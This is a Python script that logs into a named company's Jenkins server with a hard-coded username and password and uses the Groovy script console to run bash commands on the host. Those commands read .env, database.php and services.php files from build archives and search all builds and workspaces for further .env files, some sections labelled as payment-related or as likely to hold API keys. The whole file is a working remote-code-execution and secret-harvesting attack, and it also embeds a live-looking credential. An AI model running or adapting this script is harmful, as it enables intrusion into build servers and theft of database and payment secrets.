import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def run_groovy(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    r = opener.open(req, timeout=15)
    crumb = json.loads(r.read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']})
    r2 = opener.open(req2, timeout=90)
    return r2.read().decode()

# T1Envios .env file
print("=" * 60)
print("T1ENVIOS .env (admint1pagos/desarrollo)")
print("=" * 60)
q1 = 'def r = ["bash","-c","find /var/jenkins_home/jobs/t1e_legacy_back/jobs/t1e_legacy_pipe_build_sierra-t1envios-config/builds/54/archive -name .env -o -name *.env 2>/dev/null | xargs cat 2>/dev/null"].execute().text\nprintln r'
print(run_groovy(q1))

# T1Envios database.php
print("=" * 60)
print("T1ENVIOS database.php")
print("=" * 60)
q2 = 'def r = ["bash","-c","cat /var/jenkins_home/jobs/t1e_legacy_back/jobs/t1e_legacy_pipe_build_sierra-t1envios-config/builds/54/archive/admint1pagos/desarrollo/config/database.php 2>/dev/null"].execute().text\nprintln r'
print(run_groovy(q2))

# T1Envios services.php (may have API keys)
print("=" * 60)
print("T1ENVIOS services.php")
print("=" * 60)
q3 = 'def r = ["bash","-c","find /var/jenkins_home/jobs/t1e_legacy_back/jobs/t1e_legacy_pipe_build_sierra-t1envios-config/builds/54/archive -name services.php 2>/dev/null | xargs cat 2>/dev/null"].execute().text\nprintln r'
print(run_groovy(q3))

# Search for .env files across all builds with payment keywords
print("=" * 60)
print("ALL .env FILES IN BUILDS (payment-related)")
print("=" * 60)
q4 = 'def r = ["bash","-c","find /var/jenkins_home/jobs -path */builds/*/archive* -name .env -type f 2>/dev/null | head -20"].execute().text\nprintln r'
print(run_groovy(q4))

# Also check workspace envs
print("=" * 60)
print("WORKSPACE .env FILES")
print("=" * 60)
q5 = 'def r = ["bash","-c","find /var/jenkins_home/workspace -maxdepth 3 -name .env -type f 2>/dev/null | head -15"].execute().text\nprintln r'
print(run_groovy(q5))
